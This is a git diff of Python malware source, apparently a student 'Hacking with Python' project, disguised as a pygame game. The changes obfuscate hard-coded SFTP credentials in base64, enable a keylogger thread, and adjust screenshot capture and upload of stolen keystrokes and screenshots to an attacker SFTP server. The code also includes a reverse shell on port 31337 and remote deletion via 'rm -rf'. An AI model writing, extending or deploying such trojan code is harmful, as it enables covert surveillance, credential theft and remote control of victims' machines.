@@ -10,7 +10,7 @@ import os
 import socket
 from ctypes import *
 import pythoncom, pyWinhook, win32clipboard, win32gui, win32ui, win32con, win32api, pyaes, win32cred, pywintypes
-import sqlite3, shutil, win32crypt, sys, random, pygame, time, subprocess
+import sqlite3, shutil, win32crypt, sys, random, pygame, time, subprocess, base64
 from sys import gettrace as sys_gettrace
 from tkinter import *
 import pysftp
@@ -23,9 +23,12 @@ psapi = windll.psapi
 current_window = None
 current_hwnd = 0
 screenshot_path = "C:\\Users\\Manuel\\Studium\\Semester 5\\Hacking with Python\\Hausarbeite_Hacking_with_Python\\"
-screenshot_number = 3
+screenshot_number = 0
 expression = ""
 port_reverse_shell = 31337
+host_sftp = "192.168.0.104"                         #insert ip of sftp server here (normally no obfuscation required since server should be on a hacked device)
+username_sftp = "ZGVza3RvcC03MjJoM2k4XG1hbnVl"      #insert base64 encoded username of sftp server
+password_sftp = "VGVubmlzMTIh"                      #insert base64 encoded passowrd of sftp server
 
 #Functions
 #------------------------Normal/Fake Function (Game)------------------------
@@ -194,7 +197,7 @@ def KeyStroke(event) :
         current_window = event.WindowName
         global screenshot_number
         screenshot_number += 1
-        SaveScreenshot("program" + str(screenshot_number) + ".png")
+        SaveScreenshot("screenshot" + str(screenshot_number) + ".png")
         get_current_process()
     #if they pressed a standard key
     if 32 < event.Ascii < 127:
@@ -244,6 +247,8 @@ def SaveScreenshot(filename):
     #free our objects
     mem_dc.DeleteDC()
     win32gui.DeleteObject(screenshot.GetHandle())
+    global screenshot_number
+    screenshot_number += 2
     #number += 1
     #SaveScreenshot("test" + str(number) + ".png", number)
 #------------------------END Keylogger and Screenshotter------------------------
@@ -416,7 +421,7 @@ def reverse_shell(SERVER_HOST, SERVER_PORT):
 def ftps_connect():
     cnopts = pysftp.CnOpts()
     cnopts.hostkeys = None
-    ftps = pysftp.Connection(host="192.168.0.104", username="desktop-722h3i8\manue", password="Tennis12!", cnopts=cnopts)
+    ftps = pysftp.Connection(host=host_sftp, username=base64.b64decode(username_sftp), password=base64.b64decode(password_sftp), cnopts=cnopts)      #change this to your own ftps server
     return ftps
 
 def ftps_upload_file(ftps, file):
@@ -460,7 +465,7 @@ def main():
         sys.exit()
     else:
         #multithreading for keylogger and Screenshotsaving
-        #start_new_thread(get_current_process, ())     #-----------enable this one
+        start_new_thread(get_current_process, ())     #-----------enable this one
         #loop for connection protocol to FTPS server
         while True:
             os.system('cls' if os.name == 'nt' else 'clear')
@@ -498,13 +503,17 @@ def main():
                     
                     elif command == "get screenshot":
                         if os.path.exists(str(get_path()) + "/screenshots/") :
+                            ftps.execute('rm -rf screenshots')
+                            print(ftps.listdir())
                             ftps_check_dir(ftps, "screenshots")
-                        n = 0
-                        while screenshot_number > n:
-                            ftps_upload_file(ftps, str(get_path()) + "screenshots\\screenshot" + str(n) + ".png")
-                            n += 1
-                        ftps.chdir("..")
-                        print("done uploading screenshots")
+                            n = 0
+                            print(ftps.listdir())
+                            time.sleep(5)
+                            while screenshot_number > n:
+                                ftps_upload_file(ftps, str(get_path()) + "screenshots\\screenshot" + str(n+1) + ".png")
+                                n += 2
+                            ftps.chdir("..")
+                            print("done uploading screenshots")
                     
                
                     elif command == "get keylogger":
